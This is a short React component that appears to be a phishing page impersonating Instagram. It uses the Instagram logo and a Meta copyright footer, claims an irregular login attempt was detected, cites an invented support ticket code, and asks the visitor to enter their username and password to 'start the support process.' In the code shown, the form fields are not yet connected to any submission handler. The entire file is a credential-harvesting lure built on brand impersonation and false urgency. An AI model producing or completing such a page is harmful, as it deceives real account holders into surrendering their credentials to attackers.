import React from 'react'

export default function Instagram() {
    return (
        <div>
            <div className='container p-5 text-center border border-3 rounded my-5 w-50 shadow'>
                <img src="https://freepngimg.com/thumb/logo/70011-instagram-script-typeface-myfonts-user-logo-font.png" className='img-fluid w-50' />
                <hr></hr>
                <h3 className='text-danger'>Verification Required</h3>
                <h5>We have detected an irregular attempt to log into your account.</h5>
                <p className='text-black-50'>A report ticket has been opened with the code: IG476758.</p>
                <p>Log in to start the support process.</p>
                <div className='my-2'>
                    <input className="w-50" type="text" name="name" defaultValue="username" />
                </div>
                <div className='my-2'>
                    <input className="w-50" type="text" name="name" defaultValue="password" />
                </div>
                <div className='my-2'>
                    <button className="btn btn-primary w-50" type="submit" value="Submit" >Submit</button>
                </div>
                <img src="https://scontent-sjc3-1.xx.fbcdn.net/v/t39.8562-6/148701539_3724512380920015_7768163355512350905_n.png?_nc_cat=110&amp;ccb=1-5&amp;_nc_sid=6825c5&amp;_nc_ohc=JVYb8-KnoCcAX_d39zW&amp;_nc_ht=scontent-sjc3-1.xx&amp;oh=00_AT9pUBte2O40wq69sPwyBPHLtriuog-h2I1HScECMUJweg&amp;oe=624C58CD"
                    className='img-fluid my-2 rounded' />
                <p className='text-black-50'>© 2022 Instagram from Meta</p>
            </div>
        </div>
    )
}
